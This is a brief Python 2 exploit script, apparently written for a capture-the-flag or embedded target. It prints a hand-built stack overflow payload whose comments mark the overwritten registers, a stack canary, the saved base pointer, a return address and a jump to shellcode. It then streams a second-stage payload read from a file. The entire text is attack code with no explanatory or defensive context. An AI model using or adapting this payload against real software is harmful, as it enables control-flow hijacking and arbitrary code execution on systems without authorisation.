#!/usr/bin/python2

import sys
import time

fh = open(sys.argv[1], 'rb')
stage_2 = fh.read()
fh.close()

sploit = [
	'\x00', '\x00', # r7
	'\x30', '\x30', # r6
	'\x31', '\x31', # r5
	'\x32', '\x32', # r3
	'\x34', '\x33', # r2
	'\x34', '\x34', # r1
	'\x00', '\x0A', # canary
	'\x35', '\x35', # rbp
	'\x02', '\x2E', # ret
	'\x20', '\x00', # ret to shellcode
	'\x20', '\x00', # arg0 to input_read
	'\x04', '\x00', # arg1 to input_read
]

sploit = ''.join(sploit)
sys.stdout.write(sploit)
sys.stdout.flush()
time.sleep(1)
sys.stdout.write(stage_2)
sys.stdout.flush()
